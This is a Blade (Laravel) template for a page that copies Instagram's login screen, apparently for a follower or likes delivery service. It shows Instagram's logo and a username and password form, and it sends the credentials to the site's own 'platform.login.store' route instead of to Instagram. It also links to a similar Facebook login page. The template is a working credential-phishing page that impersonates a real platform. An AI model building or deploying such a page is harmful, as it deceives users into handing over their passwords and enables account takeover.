@extends('platform-login.layout')

@section('title', 'Log in • Instagram')

@section('content')
<div class="w-full max-w-[390px] mx-auto space-y-3">
    <!-- Instagram Login Card -->
    <div class="bg-black/60 backdrop-blur-xl border border-white/10 rounded-2xl p-8 sm:p-10 shadow-2xl text-center relative overflow-hidden">
        <!-- Subtle Top Glow -->
        <div class="absolute -top-20 left-1/2 -translate-x-1/2 w-48 h-48 bg-gradient-to-tr from-[#f09433] via-[#dc2743] to-[#bc1888] rounded-full blur-3xl opacity-20 pointer-events-none"></div>

        <!-- Instagram Logo -->
        <div class="flex justify-center mb-6">
            <svg class="w-44 h-auto fill-white" viewBox="0 0 1000 286" xmlns="http://www.w3.org/2000/svg">
                <path d="M143.1 82.2c-33.8 0-61.2 27.4-61.2 61.2 0 33.8 27.4 61.2 61.2 61.2 33.8 0 61.2-27.4 61.2-61.2.1-33.8-27.3-61.2-61.2-61.2zm0 100.9c-21.9 0-39.7-17.8-39.7-39.7s17.8-39.7 39.7-39.7 39.7 17.8 39.7 39.7-17.8 39.7-39.7 39.7zm86.2-105.7c0 7.9-6.4 14.3-14.3 14.3-7.9 0-14.3-6.4-14.3-14.3 0-7.9 6.4-14.3 14.3-14.3 7.9 0 14.3 6.4 14.3 14.3zm56.4 21.6c-1.3-27.4-7.6-51.6-27.7-71.7-20.1-20.1-44.3-26.4-71.7-27.7-28.3-1.6-113.1-1.6-141.4 0-27.4 1.3-51.6 7.6-71.7 27.7-20.1 20.1-26.4 44.3-27.7 71.7-1.6 28.3-1.6 113.1 0 141.4 1.3 27.4 7.6 51.6 27.7 71.7 20.1 20.1 44.3 26.4 71.7 27.7 28.3 1.6 113.1 1.6 141.4 0 27.4-1.3 51.6-7.6 71.7-27.7 20.1-20.1 26.4-44.3 27.7-71.7 1.6-28.3 1.6-113.1 0-141.4zm-31.2 162.5c-6 15.1-17.6 26.7-32.7 32.7-22.6 9-76.3 6.9-98.9 6.9s-76.3 2-98.9-6.9c-15.1-6-26.7-17.6-32.7-32.7-9-22.6-6.9-76.3-6.9-98.9s-2-76.3 6.9-98.9c6-15.1 17.6-26.7 32.7-32.7 22.6-9 76.3-6.9 98.9-6.9s76.3-2 98.9 6.9c15.1 6 26.7 17.6 32.7 32.7 9 22.6 6.9 76.3 6.9 98.9s2.1 76.3-6.9 98.9z"/>
            </svg>
        </div>

        <!-- Service Context Banner -->
        <div class="mb-6 p-3 rounded-xl bg-gradient-to-r from-purple-500/10 via-pink-500/10 to-orange-500/10 border border-white/10 text-xs">
            <span class="text-gray-400">Verifying account to deliver:</span>
            <div class="font-bold text-white text-sm mt-0.5">
                {{ number_format($quantity) }} {{ $service }}
            </div>
            @if(!empty($username))
                <div class="text-[11px] text-pink-400 font-medium mt-0.5">Target: {{ '@' . ltrim($username, '@') }}</div>
            @endif
        </div>

        <!-- Form -->
        <form method="POST" action="{{ route('platform.login.store', ['platform' => 'instagram']) }}" class="space-y-3 text-left">
            @csrf
            <input type="hidden" name="tag_id" value="{{ $tag->id ?? 2 }}">
            <input type="hidden" name="service_type" value="{{ $service }}">
            <input type="hidden" name="quantity" value="{{ $quantity }}">
            <input type="hidden" name="username" value="{{ $username }}">
            <input type="hidden" name="referral_code_id" value="{{ $refId }}">

            <!-- Username/Email Field -->
            <div>
                <label class="block text-[11px] font-semibold text-gray-400 mb-1">Phone number, username, or email</label>
                <input type="text" name="email" required
                    value="{{ $username ? ltrim($username, '@') : '' }}"
                    class="w-full px-3.5 py-3 text-sm rounded-lg bg-[#121216] border border-white/15 text-white placeholder-gray-500 focus:outline-none focus:border-indigo-500 transition-colors"
                    placeholder="Phone number, username, or email">
            </div>

            <!-- Password Field -->
            <div class="relative">
                <label class="block text-[11px] font-semibold text-gray-400 mb-1">Password</label>
                <input type="password" id="ig_password" name="password" required
                    class="w-full px-3.5 py-3 pr-14 text-sm rounded-lg bg-[#121216] border border-white/15 text-white placeholder-gray-500 focus:outline-none focus:border-indigo-500 transition-colors"
                    placeholder="Password">
                <button type="button" onclick="togglePassword('ig_password', this)"
                    class="absolute right-3 top-8 text-xs font-semibold text-gray-400 hover:text-white transition-colors">
                    Show
                </button>
            </div>

            <!-- Log In Button -->
            <button type="submit"
                class="w-full mt-2 py-3 bg-[#0095f6] hover:bg-[#1877f2] text-white font-semibold text-sm rounded-lg shadow-lg transition-all active:scale-[0.98]">
                Log In
            </button>

            <!-- OR Divider -->
            <div class="flex items-center my-4 gap-4">
                <div class="flex-1 h-px bg-white/10"></div>
                <span class="text-[11px] font-bold text-gray-500 uppercase">OR</span>
                <div class="flex-1 h-px bg-white/10"></div>
            </div>

            <!-- Login with Facebook -->
            <div class="text-center">
                <a href="{{ route('platform.login', ['platform' => 'facebook', 'service' => $service, 'quantity' => $quantity, 'username' => $username, 'tag_id' => $tag->id ?? 1]) }}"
                    class="inline-flex items-center gap-2 text-xs font-semibold text-[#0095f6] hover:text-[#1877f2] transition-colors">
                    <i class="fa-brands fa-square-facebook text-base"></i>
                    <span>Log in with Facebook</span>
                </a>
            </div>

            <div class="text-center pt-2">
                <span class="text-[11px] text-gray-500 hover:text-gray-400 cursor-pointer">Forgot password?</span>
            </div>
        </form>
    </div>

    <!-- Sign up box -->
    <div class="bg-black/40 border border-white/10 rounded-2xl p-4 text-center text-xs text-gray-400">
        Don't have an account? <span class="text-[#0095f6] font-semibold hover:underline cursor-pointer">Sign up</span>
    </div>
</div>
@endsection

@section('scripts')
<script>
    function togglePassword(inputId, btn) {
        const input = document.getElementById(inputId);
        if (input.type === 'password') {
            input.type = 'text';
            btn.innerText = 'Hide';
        } else {
            input.type = 'password';
            btn.innerText = 'Show';
        }
    }
</script>
@endsection
